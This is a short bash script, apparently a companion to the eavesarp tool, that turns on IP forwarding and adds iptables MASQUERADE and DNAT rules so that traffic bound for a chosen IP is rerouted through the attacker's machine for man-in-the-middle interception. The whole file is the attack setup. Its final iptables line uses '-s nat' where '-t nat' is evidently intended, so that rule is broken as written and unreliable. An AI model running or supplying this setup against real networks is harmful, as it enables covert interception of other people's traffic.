#!/bin/bash

dstIP=$1
ToDest=$2

if [ "$#" != "2" ]; then
        echo "**************************************************************************"
        echo "**************************************************************************"
        echo "Usage: eavesarp-MITM.sh <T-IP from eavesarp> <PTR-FWD from eavesarp>"
        echo "              Example: eavesarp-MITM.sh 192.168.1.2 192.168.1.10"
        echo "**************************************************************************"
        echo "**************************************************************************" 
        echo "**************************************************************************"
        exit 1
fi

sysctl net.ipv4.conf.eth0.forwarding=1
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -s nat -A PREROUTING --dst $dstIP -j DNAT --to-destination $ToDest
